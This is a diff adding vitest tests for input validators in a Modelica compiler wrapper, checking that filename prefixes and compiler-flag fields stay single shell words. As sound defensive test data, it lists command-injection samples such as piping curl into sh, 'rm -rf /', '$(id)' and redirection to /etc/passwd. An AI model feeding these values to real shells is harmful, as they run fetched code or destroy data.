@@ -1,10 +1,13 @@
 import { describe, expect, it } from "vitest";
 
 import {
+  classNameToFilePrefix,
   expressionFault,
+  fileNamePrefix,
   modelicaExpr,
   modelicaName,
   resultVariable,
+  shellFlags,
 } from "./fields.js";
 
 describe("the name a field is held to", () => {
@@ -97,6 +100,106 @@ describe("the variable a result field is held to", () => {
   it("still refuses a call that is not der", () => {
     for (const s of ["f(x)", "der(x), g(", "der(x))", "der(", "der()"]) {
       expect(resultVariable.safeParse(s).success).toBe(false);
+    }
+  });
+});
+
+/**
+ * Names OMC accepts that a shell does not. A Q-IDENT lexes as one Modelica
+ * token, so it carries anything but a quote or a backslash — which is what
+ * makes a legal class name a shell word once OMC pastes it into a makefile.
+ */
+const HOSTILE_NAMES = [
+  "Modelica.Blocks.Math.Gain",
+  "'evil(name)'",
+  "Pkg.'a; rm -rf x'.Model",
+  "'$(id)'",
+  "'a`b`'",
+  "'a > out'",
+  "'a\nb'",
+  "'quoted )'",
+  "'has.a.dot'",
+  "pins[3].p",
+];
+
+describe("the prefix a generated filename is held to", () => {
+  it("accepts what a filename is made of", () => {
+    for (const s of [
+      "Modelica_Blocks_Math_Gain",
+      "model.2024-05-01",
+      "_leading",
+      "0",
+      "<default>",
+    ]) {
+      expect(fileNamePrefix.safeParse(s).success).toBe(true);
+    }
+  });
+
+  it("refuses a value that would not stay one shell word", () => {
+    for (const s of [
+      "",
+      "a(b)",
+      "a; rm -rf x",
+      "$(id)",
+      "a b",
+      "../escape",
+      "-flag",
+      ".hidden",
+      "a\nb",
+      "'quoted'",
+    ]) {
+      expect(fileNamePrefix.safeParse(s).success).toBe(false);
+    }
+  });
+
+  it("derives one from any class name a cref field would accept", () => {
+    for (const name of HOSTILE_NAMES) {
+      expect(modelicaName.safeParse(name).success).toBe(true);
+      expect(
+        fileNamePrefix.safeParse(classNameToFilePrefix(name)).success,
+      ).toBe(true);
+    }
+  });
+
+  it("keeps the dotted path so two leaves do not share an output directory", () => {
+    expect(classNameToFilePrefix("A.Gain")).not.toBe(
+      classNameToFilePrefix("B.Gain"),
+    );
+  });
+});
+
+describe("the flags a compiler field is held to", () => {
+  it("accepts the flags a caller legitimately passes", () => {
+    for (const s of [
+      "",
+      "<default>",
+      "-O3",
+      "-march=native -DNDEBUG",
+      "-I/usr/include/foo -L/opt/lib",
+      "-Wl,-rpath,/opt/lib",
+      "-override=a=1,b=2",
+      "-lv=LOG_STATS,LOG_INIT",
+      "-s dassl -r out.mat",
+      "-noEquidistantTimeGrid",
+    ]) {
+      expect(shellFlags.safeParse(s).success).toBe(true);
+    }
+  });
+
+  it("refuses a value that would run a command of its own", () => {
+    for (const s of [
+      "-O2; curl http://x | sh",
+      "-O2 && rm -rf /",
+      "-O2 `id`",
+      "-O2 $(id)",
+      "-O2 $HOME",
+      "-O2 > /etc/passwd",
+      "-O2\nrm -rf /",
+      "-O2 # rest",
+      '-DV="1.0"',
+      "-O2 | tee x",
+    ]) {
+      expect(shellFlags.safeParse(s).success).toBe(false);
     }
   });
 });
